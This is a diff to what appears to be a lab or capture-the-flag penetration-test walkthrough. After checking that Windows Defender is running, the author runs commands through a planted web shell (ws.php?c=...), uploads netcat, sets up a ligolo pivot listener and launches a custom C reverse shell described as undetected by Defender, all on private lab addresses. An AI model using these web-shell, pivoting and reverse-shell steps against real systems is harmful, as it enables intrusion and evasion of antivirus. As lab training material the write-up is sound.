@@ -1416,7 +1416,29 @@ Response:
 
     AMEngineVersion : 1.1.18800.4 AMProductVersion : 4.18.2111.5 AMRunningMode : Normal AMServiceEnabled : True AMServiceVersion : 4.18.2111.5 AntispywareEnabled : True AntispywareSignatureAge : 906 AntispywareSignatureLastUpdated : 12/19/2021 8:25:06 AM AntispywareSignatureVersion : 1.355.510.0 AntivirusEnabled : True AntivirusSignatureAge : 906 AntivirusSignatureLastUpdated : 12/19/2021 8:25:08 AM AntivirusSignatureVersion : 1.355.510.0 BehaviorMonitorEnabled : True ComputerID : 2BBDBCD0-5284-4DC2-A485-BBF6999477D4 ComputerState : 0 DeviceControlDefaultEnforcement : N/A DeviceControlPoliciesLastUpdated : 6/12/2024 10:06:02 AM DeviceControlState : N/A FullScanAge : 4294967295 FullScanEndTime : FullScanStartTime : IoavProtectionEnabled : True IsTamperProtected : False IsVirtualMachine : True LastFullScanSource : 0 LastQuickScanSource : 2 NISEnabled : True ...
 
-So Defender is certainly running
+So Defender is certainly running. To get a stable reverse shell I thought to upload netcat for windows (nc64.exe), but I dont' konw why the command does not work:
+
+    http://10.200.95.31/images/ws.php?c=nc64.exe%20-h
+Returned an empty page. Probably defender is blocking the execution. Then I tried to use a simple C reverse shell that I coded, since at the moment of writing is not detected by Defender. You can get it [here](https://github.com/zinzloun/MalvasiaC). Change the server to point to the agent IP, before that we have to configure to activate a listener in ligolo to forward the traffic to our attacker machine. In ligolo console issue the following command:
+
+    [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
+
+The command will start a listener to the agent on port 1234 and forward the traffic to our attacker machine (the proxy server). So on the malvasiac reverse shelle you have to set the server IP to point to the pivoting machine (the agent), in my case to 10.200.95.33
+
+    http://10.200.95.31/images/ws.php?c=dir
+       Volume in drive C has no label. Volume Serial Number is 3A33-D07B Directory of C:\web\htdocs\images 06/12/2024 02:32 PM
+    . 06/12/2024 02:32 PM
+    .. 06/12/2024 02:26 PM 143,583 malvasia.exe 06/12/2024 02:32 PM 45,272 nc64.exe 06/12/2024 11:57 AM 75 ws.php 3 File(s) 188,930 bytes 2 Dir(s) 14,440,493,056 bytes free 
+To get a revershell directly to our attacker machine issue the following command:
+
+    http://10.200.95.31/images/ws.php?c=malvasia.exe
+
+Once executed a nc listener on port 4321, you should get a powershell reverse shell:
+
+    
+    
+
+
 
 
 
